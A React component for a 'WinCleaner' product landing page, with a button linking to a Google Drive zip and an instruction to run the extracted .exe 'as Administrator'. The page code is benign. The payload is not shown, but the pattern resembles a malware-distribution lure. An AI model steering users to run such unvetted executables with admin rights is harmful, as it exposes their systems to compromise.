import React from 'react';
import { Container, Typography, Button, Box, Paper } from '@mui/material';
import { motion } from 'framer-motion';

const WinCleaner = () => {
  return (
    <Container>
      <Box sx={{ minHeight: '100vh', pt: 10, pb: 4 }}>
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
        >
          <Typography variant="h2" component="h1" gutterBottom>
            WinCleaner
          </Typography>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.2 }}
        >
          <Typography variant="h5" gutterBottom>
            Optimize your Windows system with our powerful cleaning tool
          </Typography>
        </motion.div>

        <Box sx={{ display: 'flex', justifyContent: 'flex-end', pr: '10%' }}>
          <motion.div
            initial={{ opacity: 0, x: -50 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.8, delay: 0.4 }}
            style={{ width: '100%', maxWidth: 600 }}
          >
            <Paper 
              sx={{ 
                p: 4,
                mt: 4,
                background: 'rgba(75, 0, 130, 0.4)',
                backdropFilter: 'blur(20px)',
                border: '1px solid rgba(147, 112, 219, 0.3)',
                boxShadow: '0 8px 32px rgba(31, 38, 135, 0.37)',
                borderRadius: '20px',
                '&:hover': {
                  boxShadow: '0 8px 32px rgba(147, 112, 219, 0.37)',
                },
              }}
            >
              <Typography variant="h6" gutterBottom sx={{ color: '#E6E6FA' }}>
                Optimize your Windows system with our powerful cleaning tool
              </Typography>
              <Typography paragraph sx={{ color: '#E6E6FA' }}>
                Download and extract the zip file. After extracting, open the .exe file by "Run as Administrator".
              </Typography>
              <Button 
                variant="contained" 
                href="https://drive.usercontent.google.com/download?id=1hwc0WcJbgWXrGJ8UoDRGzvpMhXNLkShE&export=download&authuser=0"
                target="_blank"
                sx={{ 
                  background: 'linear-gradient(45deg, #9370DB 30%, #8A2BE2 90%)',
                  color: 'white',
                  padding: '12px 24px',
                  fontSize: '1.1rem',
                  textTransform: 'none',
                  borderRadius: '10px',
                  '&:hover': {
                    background: 'linear-gradient(45deg, #8A2BE2 30%, #9370DB 90%)',
                    transform: 'translateY(-2px)',
                    boxShadow: '0 8px 20px rgba(147, 112, 219, 0.4)',
                  },
                }}
              >
                Download WinCleaner
              </Button>
            </Paper>
          </motion.div>
        </Box>
      </Box>
    </Container>
  );
};

export default WinCleaner; 